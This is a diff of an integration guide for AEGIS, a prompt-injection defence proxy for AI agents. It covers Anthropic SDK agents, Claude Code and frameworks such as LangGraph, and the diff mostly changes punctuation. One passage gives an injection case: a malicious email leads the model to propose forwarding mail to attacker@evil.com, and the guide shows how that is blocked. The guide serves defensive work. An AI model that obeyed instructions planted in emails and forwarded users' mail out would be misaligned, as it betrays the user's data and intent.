@@ -23,7 +23,7 @@ Every supported provider's SDK lets you override the base URL. AEGIS speaks each
 
 ---
 
-## Case 1 — Anthropic API agent
+## Case 1. Anthropic API agent
 
 The clean case. You have a Python or TypeScript agent calling `client.messages.create(...)` with tools defined.
 
@@ -89,9 +89,9 @@ resp = client.messages.create(
 
 If the model proposes `set_email_forwarding(to="attacker@evil.com")` because a malicious email body told it to, three layers block it:
 
-- **Lattice** — proposed action's causal origin includes L0 → BLOCK.
-- **Capability** — no token minted for `set_email_forwarding` → BLOCK.
-- **Intent drift** — "set forwarding" is far from "summarize invoices" → BLOCK.
+- **Lattice**, proposed action's causal origin includes L0 → BLOCK.
+- **Capability**, no token minted for `set_email_forwarding` → BLOCK.
+- **Intent drift**. "set forwarding" is far from "summarize invoices" → BLOCK.
 
 The response is HTTP 200 with the `tool_use` block rewritten to a structured "denied" message; the agent recovers and continues.
 
@@ -106,15 +106,15 @@ The adapter tags content based on the wire-format slot it arrives in:
 | Your own RAG / vector store | `tool_result` | L0 (configurable to L1) |
 | Web fetch, scraped email, third-party API | `tool_result` | L0 |
 
-If you stuff retrieved content into a `user` message, AEGIS sees it as L2 — exactly what the lattice prevents. Use the right wire-format slot.
+If you stuff retrieved content into a `user` message, AEGIS sees it as L2, exactly what the lattice prevents. Use the right wire-format slot.
 
 ---
 
-## Case 2 — Claude Code
+## Case 2. Claude Code
 
-Claude Code itself is an agent — it runs locally and calls Anthropic's API directly using bash, file edits, and MCP servers as its tools. Two paths exist with meaningfully different protection.
+Claude Code itself is an agent, it runs locally and calls Anthropic's API directly using bash, file edits, and MCP servers as its tools. Two paths exist with meaningfully different protection.
 
-### Path A — Proxy interception
+### Path A. Proxy interception
 
 Five-minute install. Claude Code respects standard Anthropic env vars.
 
@@ -127,9 +127,9 @@ export ANTHROPIC_BASE_URL="http://localhost:8080/v1/anthropic"
 claude
 ```
 
-This gets you CCPT, canary tripwires, intent drift, and the audit log. It does not give you meaningful capability-token protection — Claude Code's tools aren't declared upfront against a clear user intent, so the capability layer has nothing to bind to.
+This gets you CCPT, canary tripwires, intent drift, and the audit log. It does not give you meaningful capability-token protection. Claude Code's tools aren't declared upfront against a clear user intent, so the capability layer has nothing to bind to.
 
-### Path B — MCP-server wrapping
+### Path B. MCP-server wrapping
 
 ```bash
 # Instead of:
@@ -139,13 +139,13 @@ claude mcp add github "npx @modelcontextprotocol/server-github"
 claude mcp add github "aegis mcp-wrap --policy strict -- npx @modelcontextprotocol/server-github"
 ```
 
-Every tool response from that MCP server is canary-scanned, tagged L0, and the wrapper drops a JSON-RPC error if a leak is detected — before the response reaches the agent.
+Every tool response from that MCP server is canary-scanned, tagged L0, and the wrapper drops a JSON-RPC error if a leak is detected, before the response reaches the agent.
 
 Use both paths together. Path A gives you traffic-level coverage; Path B hardens each MCP server you've connected.
 
 ---
 
-## Case 3 — LangGraph, CrewAI, AutoGen, custom
+## Case 3. LangGraph, CrewAI, AutoGen, custom
 
 These call Anthropic / OpenAI / Google SDKs under the hood. Deployment is identical to Case 1: set `base_url`, declare intent at the start of each user-facing task, mint capabilities for tools that task should be allowed to use.
 
@@ -153,7 +153,7 @@ The framework-specific question is *where* the intent declaration lives:
 
 | Framework | Where to declare intent |
 |---|---|
-| **LangGraph** | Graph entry node — before invoking the graph |
+| **LangGraph** | Graph entry node, before invoking the graph |
 | **CrewAI** | Wrap `crew.kickoff()` |
 | **AutoGen** | UserProxyAgent's first message handler |
 | **Custom** | Your top-level user-request handler |
@@ -241,7 +241,7 @@ open http://localhost:8080/aegis/dashboard
 
 ## Next steps
 
-- [Architecture](ARCHITECTURE.md) — how the layers compose internally
-- [Threat model](THREAT_MODEL.md) — what AEGIS defends against
-- [Operator guide](OPERATOR.md) — production deployment, tuning, observability
-- [Mental model](MENTAL_MODEL.md) — each layer explained
+- [Architecture](ARCHITECTURE.md), how the layers compose internally
+- [Threat model](THREAT_MODEL.md), what AEGIS defends against
+- [Operator guide](OPERATOR.md), production deployment, tuning, observability
+- [Mental model](MENTAL_MODEL.md), each layer explained
